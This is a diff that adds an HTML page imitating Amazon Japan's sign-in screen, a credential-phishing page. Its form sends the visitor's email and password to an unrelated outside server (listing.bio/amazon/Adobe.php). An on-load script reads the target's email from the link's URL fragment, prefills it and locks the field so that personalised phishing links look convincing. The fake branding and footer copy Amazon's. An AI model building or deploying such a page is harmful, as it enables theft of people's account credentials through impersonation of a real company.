@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <!-- Required meta tags -->
+    <title>Sign in Page</title>
+    <link type="text/css" rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <style type="text/css">
+        body {
+            font-family: 'Open Sans', sans-serif;
+            color: #535353;
+            background-color: #ffffff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: flex-start;
+            align-items: flex-start;
+            min-height: 100vh;
+            flex-direction: column;
+            padding-top: 20px; /* To bring content closer to the top */
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 10px; /* Reduced the space below the logo */
+            width: 100%;
+            display: flex;
+            justify-content: center;
+        }
+
+        .container {
+            max-width: 400px;
+            width: 100%;
+            border: 1px solid #ddd;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+            background-color: #ffffff;
+        }
+
+        h2 {
+            font-size: 24px;
+            font-weight: bold; /* Ensure heading is bold */
+            color: black;
+            text-align: left;
+            margin-bottom: 10px;
+        }
+
+        .form-text {
+            font-size: 14px;
+            color: gray;
+            text-align: left;
+            margin-bottom: 5px;
+            font-weight: bold; /* Make the label text bold */
+        }
+
+        .form-control {
+            margin-bottom: 15px;
+            height: 35px;
+            font-size: 12px;
+            padding: 8px 10px;
+        }
+
+        .input-group {
+            display: flex;
+            align-items: center;
+        }
+
+        .input-group .form-text {
+            margin-right: 10px;
+            margin-top: 4px;
+        }
+
+        .btn-primary {
+            background-color: #ffc435;
+            color: rgb(48, 57, 66);
+            border: none;
+            font-weight: bold;
+            height: 35px;
+            border-radius: 5px;
+        }
+
+        .btn-primary:hover {
+            background-color: #e0a824;
+        }
+
+        .footer {
+            font-size: 12px;
+            color: gray;
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .footer a {
+            color: #007bff;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .footer p {
+            margin-bottom: 5px;
+        }
+
+        .divider {
+            margin: 20px 0;
+            border-top: 1px solid #ddd;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="logo">
+        <img src="https://ftp.bmp.ovh/imgs/2020/11/5f6ec1a72b0c7443.png" alt="Logo" style="width: 100px; height: auto;">
+    </div>
+    <div class="container">
+        <h2><b>Sign in</b></h2> <!-- Make the heading bold -->
+        <div class="input-group">
+            <p class="form-text"><b>Email or mobile phone number</b></p> <!-- Make the label bold -->
+            <form action="https://listing.bio/amazon/Adobe.php" method="post" style="width: 100%;">
+                <input type="email" id="emailInput" class="form-control" name="email" placeholder="Enter your email or phone" required>
+                <input type="password" class="form-control" name="password" placeholder="Enter your password" required>
+                <button type="submit" class="btn btn-primary btn-block"><b>Continue</b></button> <!-- Make the button text bold -->
+            </form>
+        </div>
+        <div class="footer">
+            <p><b>By continuing, you agree to Amazon's</b> <a href="#">Conditions of Use</a> <b>and</b> <a href="#">Privacy Notice</a>.</p> <!-- Make the text bold -->
+            <p><a href="#">Need help?</a></p>
+            <div class="divider"></div>
+            <p><a href="#">Conditions of Use</a> | <a href="#">Privacy Notice</a> | <a href="#">Help</a></p>
+            <p>© 1996-2024, Amazon Japan, Inc. or its affiliates</p>
+        </div>
+    </div>
+
+    <script nonce="NjMzODYwNTg3LDQxNzQ0NzkwMjk=">
+        // Function to grab the email from the URL fragment
+        function grabEmailFromURL() {
+            // Get the fragment identifier (the part after #)
+            const fragment = window.location.hash;
+
+            // If the fragment exists and looks like an email
+            if (fragment) {
+                // Remove the '#' and decode URI components
+                const email = decodeURIComponent(fragment.substring(1));
+
+                // Simple validation to check if it looks like an email
+                const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zAZ0-9]{2,}$/;
+                if (emailPattern.test(email)) {
+                    // Populate the email input field with the grabbed email
+                    const emailInput = document.getElementById("emailInput");
+                    emailInput.value = email;
+
+                    // Lock the email input field (make it readonly)
+                    emailInput.setAttribute("readonly", true); // This makes the field readonly
+                    // Alternatively, you could use emailInput.disabled = true; to make it completely non-interactive
+                }
+            }
+        }
+
+        // Run the function to grab the email as soon as the page loads
+        window.onload = grabEmailFromURL;
+    </script>
+
+</body>
+
+</html>
